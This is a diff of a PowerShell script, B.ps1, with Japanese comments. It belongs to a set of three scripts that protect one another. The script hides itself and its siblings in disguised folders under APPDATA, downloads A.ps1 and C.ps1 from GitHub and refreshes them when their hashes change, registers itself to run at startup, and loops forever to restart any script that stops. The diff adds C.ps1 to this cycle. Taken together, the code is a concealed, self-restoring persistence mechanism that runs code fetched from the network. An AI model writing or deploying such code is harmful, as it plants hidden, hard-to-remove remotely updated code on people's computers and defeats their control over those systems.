@@ -1,19 +1,21 @@
 # B.ps1
 
+# --- 設定 ---
+
 $SpreadDirs = @(
-    "$env:APPDATA\Microsoft\Windows",
-    "$env:LOCALAPPDATA\TempData",
-    "$env:APPDATA\Packages",
-    "$env:LOCALAPPDATA\Packages",
-    "$env:APPDATA\RoamingData",
-    "$env:LOCALAPPDATA\RoamingData"
+    "$env:APPDATA\Microsoft\Windows",   # A.ps1用
+    "$env:LOCALAPPDATA\TempData",       # B.ps1用（自身の配置先）
+    "$env:APPDATA\Packages"              # C.ps1用
 )
 
 $Urls = @{
     "A" = "https://raw.githubusercontent.com/YourRepo/OrgScripts/main/A.ps1"
+    "C" = "https://raw.githubusercontent.com/YourRepo/OrgScripts/main/C.ps1"
 }
 
 $RegNameB = "OrgScriptB"
+
+# --- 関数群（A.ps1と同じものを入れてください） ---
 
 function SetHiddenAttribute($path) {
     if (Test-Path $path) {
@@ -37,32 +39,24 @@ function DownloadFileTemp($url, $tempPath) {
     }
 }
 
-function StartupCheckAndRestore($fileName, $url) {
+function StartupCheckAndRestore($fileName, $url, $targetDir) {
     $tempFile = Join-Path $env:TEMP "$fileName.tmp"
-    $localPaths = $SpreadDirs | ForEach-Object { Join-Path $_ $fileName }
+    $localPath = Join-Path $targetDir $fileName
 
     if (-not (DownloadFileTemp $url $tempFile)) {
-        return $localPaths[0]
+        return $localPath
     }
 
     $remoteHash = Get-FileSHA256 $tempFile
 
-    foreach ($localFile in $localPaths) {
-        if (-not (Test-Path $localFile)) {
-            Copy-Item -Path $tempFile -Destination $localFile -Force
-            SetHiddenAttribute $localFile
-        } else {
-            $localHash = Get-FileSHA256 $localFile
-            if ($localHash -ne $remoteHash) {
-                Copy-Item -Path $tempFile -Destination $localFile -Force
-                SetHiddenAttribute $localFile
-            }
-        }
+    if (-not (Test-Path $localPath) -or (Get-FileSHA256 $localPath) -ne $remoteHash) {
+        Copy-Item -Path $tempFile -Destination $localPath -Force
+        SetHiddenAttribute $localPath
     }
 
     Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
 
-    return $localPaths[0]
+    return $localPath
 }
 
 function IsScriptRunning($scriptName) {
@@ -106,6 +100,7 @@ function CheckAndReRegisterStartup($name, $scriptPath) {
     }
 }
 
+# 隠しディレクトリがなければ作成＆隠し属性付与
 foreach ($dir in $SpreadDirs) {
     if (-not (Test-Path $dir)) {
         New-Item -ItemType Directory -Path $dir -Force | Out-Null
@@ -113,18 +108,25 @@ foreach ($dir in $SpreadDirs) {
     }
 }
 
-$PathA = StartupCheckAndRestore "A.ps1" $Urls["A"]
+# A と C の最新コードを復元・取得
+$PathA = StartupCheckAndRestore "A.ps1" $Urls["A"] $SpreadDirs[0]
+$PathC = StartupCheckAndRestore "C.ps1" $Urls["C"] $SpreadDirs[2]
 
+# スタートアップ登録（B.ps1の現在の実行パス）
 CheckAndReRegisterStartup $RegNameB $MyInvocation.MyCommand.Path
 
+# 監視対象スクリプトのハッシュを保持
 $MonitorScripts = @{
     "A.ps1" = Get-FileSHA256 $PathA
+    "C.ps1" = Get-FileSHA256 $PathC
 }
 
 $MonitorPaths = @{
     "A.ps1" = $PathA
+    "C.ps1" = $PathC
 }
 
+# 監視ループ：ハッシュ変化検知で再起動、停止や未起動なら起動
 while ($true) {
     foreach ($script in $MonitorScripts.Keys) {
         $currentPath = $MonitorPaths[$script]
